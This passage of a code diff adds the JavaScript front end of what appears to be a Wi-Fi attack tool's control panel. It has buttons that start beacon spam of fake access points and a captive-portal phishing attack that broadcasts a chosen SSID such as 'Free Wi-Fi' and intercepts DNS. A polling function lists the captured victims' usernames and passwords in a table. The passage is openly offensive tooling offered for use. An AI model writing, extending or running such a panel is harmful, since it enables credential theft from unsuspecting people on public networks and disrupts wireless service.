+  lbl.textContent = state ? 'ON' : 'OFF';
+  lbl.style.color = state ? 'var(--success)' : 'var(--text-muted)';
+  await fetch(`/spam?type=beacon&state=${state ? 'on' : 'off'}&prefix=${prefix}&count=${count}`);
+  
+  if (state) {
+    document.getElementById('spamStatus').innerHTML = `Status: <span style="color:var(--success)">Spamming ${count} APs with prefix '${decodeURIComponent(prefix)}'</span>`;
+    showPopup('Spammer ON', `Broadcasting ${count} fake APs…`, 'broadcast-tower');
+    setGlobalStatus('Spamming APs', 'pill-blue pulse', 'broadcast-tower');
+  } else {
+    document.getElementById('spamStatus').innerHTML = '<i class="fas fa-info-circle"></i> Status: <span style="color:var(--text-muted)">Idle</span>';
+    setGlobalStatus('System Idle', 'pill-outline', 'circle-notch');
+  }
+}
+
+// ---------------------------------------------------------------------------
+// Captive Portal (Phishing)
+// ---------------------------------------------------------------------------
+async function startPhishing() {
+  const ssid = document.getElementById('phishingSSID').value || 'Free Wi-Fi';
+  const res = await fetch(`/phishing_start?ssid=${encodeURIComponent(ssid)}`);
+  if (res.ok) {
+    document.getElementById('phishingStatusText').innerHTML = `<span style="color:var(--danger)">Active - Broadcasting '${ssid}'</span>`;
+    showPopup('Captive Portal Active', `Broadcasting '${ssid}' and intercepting DNS`, 'fish');
+    setGlobalStatus('Phishing Active', 'pill-red pulse', 'fish');
+    clearInterval(phishingInterval);
+    phishingInterval = setInterval(pollPhishingResults, 3000);
+  }
+}
+async function stopPhishing() {
+  await fetch('/phishing_stop');
+  clearInterval(phishingInterval);
+  document.getElementById('phishingStatusText').innerHTML = '<span style="color:var(--text-muted)">Idle</span>';
+  setGlobalStatus('System Idle', 'pill-outline', 'circle-notch');
+  showPopup('Captive Portal Stopped', 'Attack halted.', 'check-circle');
+}
+async function pollPhishingResults() {
+  const res = await fetch('/phishing_results');
+  const data = await res.json();
+  const tbody = document.getElementById('phishingBody');
+  if (!data.length) {
+    tbody.innerHTML = '<tr><td colspan="3" class="empty-msg">No credentials captured yet.</td></tr>';
+    return;
+  }
+  tbody.innerHTML = '';
+  data.forEach(c => {
+    tbody.innerHTML += `<tr>
+      <td style="font-weight:600;color:var(--danger)">${c.username}</td>
+      <td style="font-family:monospace">${c.password}</td>
+      <td style="color:var(--text-muted);font-size:0.85rem">${c.time}</td>
+    </tr>`;
+  });
+}
+async function clearPhishing() {
+  await fetch('/phishing_clear');
+  document.getElementById('phishingBody').innerHTML = '<tr><td colspan="3" class="empty-msg">No credentials captured yet.</td></tr>';
+  showPopup('Cleared', 'Captured credentials cleared.', 'trash');
+}
+</script>
+</body>
+</html>
